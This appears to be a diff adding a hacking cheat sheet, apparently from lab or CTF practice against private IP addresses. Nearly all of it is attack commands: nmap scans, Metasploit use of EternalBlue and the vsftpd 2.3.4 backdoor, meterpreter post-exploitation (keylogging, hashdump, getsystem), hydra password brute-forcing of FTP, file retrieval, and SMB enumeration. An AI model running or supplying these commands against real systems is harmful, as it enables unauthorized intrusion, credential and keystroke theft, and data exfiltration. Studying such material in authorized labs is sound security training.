@@ -1,0 +1,79 @@
+SYSTEM HACKING:
+terminal-1:
+nmap -sV 192.168.54.131 -p-
+
+terminal-2:
+msfconsole
+search ms17-010
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.54.131
+run
+back 
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.54.131
+run
+
+Scanning network:
+
+nmap 192.168.44.128 [single ip scan]
+nmap 192.168.44.128/24 [ip range scan]
+nmap -sS 192.168.44.128 [tcp syn scan]
+nmap -sT 192.168.44.128 [tcp port scan]
+nmap -sU 192.168.44.128 [udp port scan]
+nmap -O 192.168.44.128 [os detection]
+nmap -sV 192.168.44.128 [version detection]
+nmap -sV --version-intensity 9 192.168.44.128 [version detection]
+nmap -sV -A  192.168.44.128 [aggressive scan]
+nmap -sn  192.168.44.1-255 [host discovery]
+nmap -p 80  192.168.44.128 [single port scan]
+nmap -p 80,21,22  192.168.44.128 [multiple port scan]
+nmap -p 1-65535  192.168.44.128 [port range scan]
+nmap -F  192.168.44.128 [top 100 used ports]
+nmap -sS  192.168.44.128 >> outputfile.txt [scan result in file]
+
+Vulnerability Assessment:
+searchsploit vsftpd 2.3.4
+Use nessus for vulnerability assessment
+
+Exploitation:
+
+Exploiting vsftpd 2.3.4
+Terminal-1:
+nmap 192.168.191.130
+nmap -sV 192.168.191.130
+
+Terminal-2:
+msfconsole
+search vsftpd 2.3.4
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set RHOSTS 192.168.191.130
+exploit
+
+Post exploitation:
+In the meterpreter shell:
+ps --> to see all the process
+help --> to get help 
+migrate 3028 --> to migrate process
+screenshot
+screenshare
+getsystem
+keyscan_start
+keyscan_dump
+hashdump
+run winenum
+
+FTP enumeration:
+hydra -l mike -P /usr/share/wordlists/rockyou.txt  10.10.223.220 ftp -v
+nmap -sC -p21 192.168.149.128    [for enumerating which ftp port is open]
+nmap -sC -p21 192.168.149.*     [for enumerating which ftp port is open]
+hydra -L /usr/share/wordlists/metasploit/common_roots.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt  192.168.149.129 ftp    [bruteforcing ftp, smtp and many more]
+ftp 192.168.149.129    [for creating ftp connection]
+Now put username password
+get secret.txt    [for downloading anything from remote server]
+download secret.txt    [for downloading anything from remote server]
+
+SMB enumeration:
+nmap -sS -T4 --script vuln 10.10.50.26
+smbclient -L 10.129.1.12
+smbclient //10.129.1.12/WorkShares
